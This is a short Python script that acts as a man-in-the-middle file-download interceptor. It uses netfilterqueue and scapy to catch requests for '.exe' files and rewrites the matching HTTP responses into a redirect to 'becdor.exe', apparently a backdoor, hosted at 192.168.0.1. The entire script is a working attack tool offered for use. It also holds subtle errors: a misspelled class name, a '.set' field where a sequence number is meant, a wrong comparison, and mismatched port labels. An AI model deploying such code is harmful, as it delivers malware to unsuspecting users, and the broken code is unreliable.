#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    ip_packet = scapy.IP(packet.get_payload())
    if ip_packet.haslayer(scapy.Raw):
        if ip_packet[scapy.TCP].dport == 10000 and "192.168.0.1" not in ip_packet[scapy.Raw].load:
            if ".exe" == ip_packet[scapy.Raw].load:
                print("[+] HTTP Request port 80, exe file.")
                ack_list.append(ip_packet[scapy.TCP].ack)
        elif ip_packet[scapy.TCP].sport == 10000 and "192.168.0.1" not in ip_packet[scapy.Raw].load:
            if ip_packet[scapy.TCP].set in ack_list:
                ack_list.remove(ip_packet[scapy.TCP].set)
                print("[+] HTTP Response port 80")
                ip_packet = set_load(ip_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.0.1/becdor.exe\n\n")
                packet.set_payload(str(ip_packet))
    packet.accept()


queue = netfilterqueue.NerfilterQueue()
queue.bind(0, process_packet)
queue.run()